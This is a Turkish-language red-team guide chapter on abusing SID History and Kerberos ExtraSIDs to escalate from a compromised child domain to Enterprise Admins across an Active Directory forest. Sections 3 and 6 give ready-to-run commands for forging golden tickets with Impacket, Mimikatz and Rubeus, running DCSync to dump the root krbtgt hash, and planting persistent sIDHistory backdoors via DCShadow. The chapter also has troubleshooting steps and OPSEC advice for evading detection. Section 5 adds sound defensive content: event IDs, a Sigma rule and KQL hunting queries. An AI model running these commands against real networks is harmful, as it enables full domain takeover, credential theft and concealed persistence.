## 1. Kavramsal Temel — Neden Var?

Windows NT ve Active Directory mimarisinde erişim yetkilendirmesi, kullanıcının oturum belirtecinde (Access Token) yer alan **Güvenlik Tanımlayıcıları (SID - Security Identifier)** ile hedef nesnenin Erişim Kontrol Listesi (ACL / DACL) arasındaki eşleşmeye dayanır.

**SID History (`sIDHistory` Nitelik):**
Active Directory ortamlarında şirket birleşmeleri veya etki alanı göçleri (migration) sırasında, kullanıcılar eski etki alanından yeni etki alanına taşındığında eski kaynaklara (dosya paylaşımları, intranet portalları) erişimlerini kaybetmesinler diye tasarlanmıştır. Kullanıcı yeni etki alanında oturum açtığında, LSASS süreci kullanıcının eski SID değerlerini `sIDHistory` alanından okur ve kullanıcının erişim belirtecine (Token) ekler.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                 INTRA-FOREST YÜKSELTME VE SID HISTORY AKIŞI                 │
└─────────────────────────────────────────────────────────────────────────────┘

  [Child Domain (child.corp.local)]                      [Forest Root Domain (corp.local)]
  (Saldırgan child DC'yi ele geçirdi)                    (Hedef: Enterprise Admins)
           │                                                           │
           │ 1. Child krbtgt hash'i ile Golden Ticket üret             │
           │    PAC ExtraSIDs: S-1-5-21-<ROOT_DOMAIN>-519              │
           │                                                           │
           │ 2. Kök DC'ye Inter-Realm TGT Sunulur                      │
           ├──────────────────────────────────────────────────────────►│
           │    İki yönlü geçişli (Transitive) güven devrede           │
           │    İntra-forest güveninde SID FILTERING KAPALIDIR!        │
           │                                                           │
           │ 3. Kök DC ExtraSIDs'i Doğrular ve Token'a Ekler           │
           │◄──────────────────────────────────────────────────────────┤
           │    Oturum Belirteci: [child\Administrator + EA (519)]     │
           │                                                           │
           │ 4. Forest Kökünde DCSync (Kök krbtgt Hasadı)              │
           ├──────────────────────────────────────────────────────────►│
           │    Tüm orman seviyesinde Tier-0 tam hakimiyet!            │
           ▼                                                           ▼
```

### Neden Forest Sınırında Bu Kadar Ölümcüldür?
1. **Domain vs. Forest Güvenlik Sınırı:** Microsoft'un resmi güvenlik mimarisine göre **Active Directory'de etki alanı (Domain) bir güvenlik sınırı DEĞİLDİR; tek nihai güvenlik sınırı Orman'dır (Forest).**
2. **Intra-Forest SID Filtreleme Yokluğu:** Aynı orman içerisindeki etki alanları (Child-Parent) arasında çift yönlü ve geçişli (transitive) güven bulunur. Orman içi replikasyonun ve yönetimin bozulmaması için **SID Filtering (Karantina) mekanizması intra-forest güvenlerde varsayılan olarak uygulanmaz**.
3. **Görünmez Grup Üyeliği:** `sIDHistory` niteliğine veya biletin `ExtraSIDs` alanına bir grup SID'si enjekte edildiğinde, kullanıcı teknik olarak gruba üye eklenmez. Bu sayede `Get-ADGroupMember "Enterprise Admins"` gibi standart denetim sorgularında saldırgan hesabı asla görünmez.

## 2. Teknik Derinlik — ExtraSIDs, RID ve PAC Anatomisi

### 2.1 Kritik Göreceli Tanımlayıcılar (Well-Known RIDs)
Her etki alanının kendine özgü bir Domain SID (`S-1-5-21-...`) kökü vardır. Bu kökün sonuna eklenen RID (Relative ID) nesnenin kimliğini belirler:

| RID | Hedef Grup / Rol | Yetki Kapsamı |
|---|---|---|
| **512** | Domain Admins | Etki alanı düzeyinde tam yönetim yetkisi. |
| **516** | Domain Controllers | Etki alanı denetleyicileri makine grubu. |
| **518** | Schema Admins | Orman şemasını değiştirme yetkisi (Orman çapında). |
| **519** | **Enterprise Admins** | **Tüm ormandaki tüm etki alanlarında koşulsuz Tier-0 yetkisi.** |
| **520** | Group Policy Creator Owners | GPO oluşturma ve bağlantı yönetimi yetkisi. |

### 2.2 PAC ExtraSIDs Veri Alanı
Kerberos biletinin şifreli `enc-part` bölümünde taşınan `KERB_VALIDATION_INFO` (MS-PAC) yapısında şu alanlar yer alır:
- `UserId`: Kullanıcının kendi RID'i (Örn: 500 veya standart kullanıcı).
- `PrimaryGroupId`: Birincil grup RID'i (Örn: 513 Domain Users).
- `GroupCount` & `GroupIds`: Kullanıcının üye olduğu yerel grupların RID dizisi.
- `ExtraSidCount` & `ExtraSids`: Kullanıcının `sIDHistory` niteliğinden gelen veya sahte bilet üreticisinin eklediği **tam SID dizisi** (`KERB_SID_AND_ATTRIBUTES`).

Kök etki alanı denetleyicisi bir alt etki alanından gelen TGT'yi değerlendirirken, `ExtraSids` alanında gördüğü `S-1-5-21-<ROOT>-519` SID'sini doğrudan oturum belirtecine kopyalar. Intra-forest'ta SID karantinası bulunmadığı için kök DC bileti reddetmez.

## 3. Pratik Uygulama — Çok Araçlı Komut Kılavuzu

### 3.1 Kök Etki Alanı SID Değerinin Keşfi
```powershell
# PowerView ile kök etki alanının Domain SID değerini bulma
Get-DomainSID -Domain corp.local

# ActiveDirectory PowerShell modülü ile:
(Get-ADDomain corp.local).DomainSID.Value
```

### 3.2 Impacket ticketer ile ExtraSIDs Golden Ticket (Linux)
```bash
# 1. Child domain krbtgt hash'i ile Forest Root Enterprise Admins bileti üretme
impacket-ticketer -nthash <child_krbtgt_hash> \
  -domain-sid S-1-5-21-2222222222-2222222222-2222222222 \
  -domain child.corp.local \
  -extra-sid S-1-5-21-1111111111-1111111111-1111111111-519 \
  Administrator

# 2. Bileti ortam değişkenine tanımlama
export KRB5CCNAME=Administrator.ccache

# 3. Kök etki alanı DC'sinde DCSync çalıştırarak kök krbtgt hash'ini çekme
impacket-secretsdump -k -no-pass corp.local/Administrator@dc-root.corp.local -just-dc-user krbtgt
```

### 3.3 Mimikatz ile Bellek İçi Intra-Forest Sıçrama (Windows)
```cmd
:: Child DC üzerinde oturum açıldığında kök EA SID'si ile bilet enjekte etme
mimikatz.exe
privilege::debug
kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-2222222222-2222222222-2222222222 /krbtgt:<child_krbtgt_hash> /sids:S-1-5-21-1111111111-1111111111-1111111111-519 /ptt
exit

:: Kök DC'ye erişimi doğrula:
dir \\dc-root.corp.local\C$
```

### 3.4 Kalıcı sIDHistory Enjeksiyonu (DCShadow)
Golden Ticket uçucudur (krbtgt değişince silinir). Kalıcı bir arka kapı için etki alanındaki sıradan bir kullanıcının `sIDHistory` alanına doğrudan yazılabilir:

```cmd
:: Konsol 1: Hedef kullanıcıya kök Enterprise Admins SID'sini tanımlayın
mimikatz.exe
lsadump::dcshadow /object:CN=lowuser,OU=Personel,DC=child,DC=corp,DC=local /attribute:sIDHistory /value:S-1-5-21-1111111111-1111111111-1111111111-519
exit

:: Konsol 2: Değişikliği replikasyon üzerinden etki alanına enjekte edin
mimikatz.exe
lsadump::dcshadow /push
exit
```

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Durum | Teknik Neden | Çözüm / Yaklaşım |
|---|---|---|
| `KDC_ERR_POLICY` / `STATUS_AUTHENTICATION_FIREWALL_FAILED` | İki etki alanı arasındaki güvende "Seçici Kimlik Doğrulama (Selective Authentication)" etkindir. | Hedef kök sunucu nesnesi üzerinde çağıran hesaba "Allowed to Authenticate" hakkı verilmelidir veya geçiş noktası değiştirilmelidir. |
| `KRB_AP_ERR_BAD_INTEGRITY (0x1f)` | Bilet üretiminde kullanılan child `krbtgt` anahtarı veya inter-realm trust anahtarı yanlıştır. | Child DC üzerinde `secretsdump` ile `krbtgt` NT ve AES anahtarını yeniden doğrulayın. |
| `STATUS_TRUST_FAILURE (0xc000018b)` | Child ile kök etki alanı arasındaki güven ilişkisi bozuktur veya güven parolası senkronize değildir. | Güven durumunu `nltest /sc_query:corp.local` komutuyla teyit edin. DC'lerin birbirine DNS ve SMB üzerinden erişebildiğini denetleyin. |
| `SID Filtering Blocks Injected SID (ExtraSIDs Silindi)` | Test edilen ortam aynı forest içi (intra-forest) değil, harici (external) veya cross-forest güvendir ve SID Filtering aktiftir. | Ormanlar arası senaryoda [10.2 Cross-Forest Trust Abuse](./10.2_Cross_Forest_Trust_Abuse.md) adımlarını izleyin; standart `519` SID karantinada budanır. |
| `DsAddSidHistory: ERROR_DS_UNWILLING_TO_PERFORM (0x2035)` | LDAP API üzerinden sIDHistory eklenirken denetim veya şema gereksinimleri karşılanmamıştır. | Standart API yerine DCShadow veya Mimikatz doğrudan bellek enjeksiyonu (`kerberos::golden /sids`) kullanın. |
| `KDC_ERR_S_PRINCIPAL_UNKNOWN (0x07)` | Bilet sunulurken kök DC'nin FQDN veya SPN kaydı çözümlenememiştir. | DNS forwarder ayarlarını ve kök DC'nin DNS çözümlemesini teyit edin (`nslookup dc-root.corp.local`). |

## 5. Bıraktığı İz, Karşı Tespit ve Tehdit Avcılığı

### 5.1 Olay Günlükleri Analiz Matrisi

| Olay Kimliği | Günlük Kaynağı | Anlamı ve Tespit Sinyali |
|---|---|---|
| **Event ID 5136** | Security (DC) | **Dizin Hizmeti Değişikliği:** Bir hesabın `sIDHistory` niteliğine yeni bir SID yazılması (Özellikle `-519`, `-512` gibi ayrıcalıklı RID'ler). |
| **Event ID 4769** | Security (Root DC) | **Kerberos TGS Talebi:** Child etki alanından gelen TGT içinde kök etki alanına ait ayrıcalıklı SID'lerin bulunması. |
| **Event ID 4624 (Logon Type 3)** | Security (Root DC) | Ağ Oturumu: Child etki alanı kullanıcısının kök DC üzerinde `Enterprise Admins` yetkisiyle oturum açması. |
| **Event ID 4765** | Security (DC) | Bir hesaba `sIDHistory` niteliğinin eklendiğini bildiren doğrudan güvenlik denetim kaydı. |

### 5.2 MITRE ATT&CK Eşleştirmesi
- **Taktik:** Privilege Escalation (TA0004), Defense Evasion (TA0005), Lateral Movement (TA0008)
- **Teknik:** Access Token Manipulation: SID-History Injection ([T1134.005](https://attack.mitre.org/techniques/T1134/005/))
- **İlişkili Teknik:** Domain Trust Discovery ([T1482](https://attack.mitre.org/techniques/T1482/))

### 5.3 OPSEC Stratejileri

| Eylem | Tespit Riski | Karşı Önlem / Strateji |
|---|---|---|
| **Kalıcı sIDHistory Yazımı** | **Yüksek** | Dizin veritabanına yazılan `sIDHistory` periyodik LDAP denetimleriyle kolayca avlanır. Mümkünse yalnızca bilet tabanlı (ExtraSIDs) kalın. |
| **ExtraSIDs Golden Ticket** | **Orta** | Dizin nesnesini değiştirmez; yalnızca Kerberos bilet ömrü boyunca geçerlidir. Ancak kök DC'deki 4769 TGS logları incelenirse yakalanabilir. |
| **Forest Kökünde DCSync** | **Yüksek** | Kök DC üzerinde DC olmayan bir IP'den replikasyon çağrısı (4662) anında alarm üretir. |

### 5.4 SIEM ve Tehdit Avcılığı Kuralları

**Sigma Kuralı — sIDHistory Alanına Ayrıcalıklı SID Yazımı:**
```yaml
title: Privileged SID Written to sIDHistory
id: c71a2e45-1234-4a56-b789-sidhist0001
status: production
description: Detects directory service changes where well-known privileged RIDs (512, 519, 518) are injected into sIDHistory.
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'sIDHistory'
    AttributeValue|re: 'S-1-5-21-.*-(512|516|518|519|520)$'
  condition: selection
level: critical
```

**KQL Sorgusu (Microsoft Sentinel — Yetim veya Ayrıcalıklı sIDHistory Avı):**
```kusto
IdentityInfo
| where isnotempty(SidHistory)
| mv-expand SidHistory
| extend InjectedSID = tostring(SidHistory)
| where InjectedSID endswith "-519" or InjectedSID endswith "-512" or InjectedSID endswith "-518"
| project TimeGenerated, AccountName, AccountDomain, InjectedSID, GroupMembership
```

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```powershell
# Komut 1: Kök etki alanının Domain SID değerini tek satırda çekme
(Get-ADDomain corp.local).DomainSID.Value
```
* **Ne Yapar?:** Hedef kök etki alanının temel SID dizesini (`S-1-5-21-...`) sorgular ve ekrana basar.
* **Ne Zaman Kullanılır?:** Enterprise Admins RID'i (519) ile birleştirilip ExtraSIDs parametresi hazırlanırken.
* **Parametreler:** `.DomainSID.Value`: Saf metin formatında SID dizesini döndürür.

```bash
# Komut 2: Impacket ile ExtraSIDs parametresi eklenmiş Golden Ticket üretme
impacket-ticketer -nthash <child_krbtgt> -domain-sid <CHILD_SID> -domain child.corp.local -extra-sid <ROOT_SID>-519 Administrator
```
* **Ne Yapar?:** Child etki alanı `krbtgt` anahtarıyla, kök etki alanının Enterprise Admins SID'sini içeren sahte bir TGT oluşturur.
* **Ne Zaman Kullanılır?:** Child DC düşürüldükten sonra tüm forest kökünü saniyeler içinde ele geçirmek için.
* **Parametreler:** `-extra-sid`: Bilete eklenecek ek yetkili SID değeri; `-nthash`: Child krbtgt NT karması.

```powershell
# Komut 3: Windows oturumunda Mimikatz ile anında ExtraSIDs enjeksiyonu (/ptt)
Rubeus.exe golden /rc4:<child_krbtgt> /domain:child.corp.local /sid:<CHILD_SID> /sids:<ROOT_SID>-519 /user:Administrator /ptt
```
* **Ne Yapar?:** Windows belleğinde sahte TGT inşa edip mevcut oturuma yükler (`Pass-the-Ticket`).
* **Ne Zaman Kullanılır?:** Windows makinesinde C2 ajanı veya yerel konsoldan doğrudan kök DC'ye geçmek için.
* **Parametreler:** `/sids`: Enjekte edilecek Enterprise Admins SID dizesi; `/ptt`: Belleğe anında bilet enjeksiyonu.

```cmd
:: Komut 4: DCShadow kullanarak sıradan kullanıcıya kalıcı sIDHistory ekleme
mimikatz.exe "lsadump::dcshadow /object:CN=lowuser,CN=Users,DC=child,DC=corp,DC=local /attribute:sIDHistory /value:<ROOT_SID>-519" exit
```
* **Ne Yapar?:** Dizin veritabanında `lowuser` kullanıcısının `sIDHistory` özniteliğine Enterprise Admins SID'sini yazar.
* **Ne Zaman Kullanılır?:** Grup üyeliği denetimlerine takılmayan kalıcı bir intra-forest arka kapısı kurmak için.
* **Parametreler:** `/object`: Hedef kullanıcı; `/attribute`: `sIDHistory`; `/value`: Enjekte edilecek tam SID.

```bash
# Komut 5: Üretilen ExtraSIDs bileti ile kök DC'de DCSync çalıştırma
impacket-secretsdump -k -no-pass corp.local/Administrator@dc-root.corp.local -just-dc-user krbtgt
```
* **Ne Yapar?:** Kerberos oturumu üzerinden kök etki alanının `krbtgt` ve `Administrator` hash'lerini uzaktan çeker.
* **Ne Zaman Kullanılır?:** ExtraSIDs biletinin geçerliliğini teyit edip tüm forest'ın kök anahtarlarını hasat etmek için.
* **Parametreler:** `-k -no-pass`: `KRB5CCNAME` biletini kullanarak parolasız Kerberos kimlik doğrulaması yapar.

```powershell
# Komut 6: Etki alanında ayrıcalıklı SID History taşıyan şüpheli hesapları tarama
Get-ADUser -Filter * -Properties sIDHistory | Where-Object { $_.sIDHistory -match '-(512|518|519)$' } | Select-Object Name, sIDHistory
```
* **Ne Yapar?:** Tüm Active Directory kullanıcılarını sorgulayarak `sIDHistory` alanında yönetici RID'leri taşıyanları listeler.
* **Ne Zaman Kullanılır?:** Sızma testi sonrası temizlik doğrulaması veya mavi takım tehdit avcılığı taramalarında.
* **Parametreler:** `-Properties sIDHistory`: Standart çıktıda yer almayan sIDHistory alanını LDAP'tan talep eder.
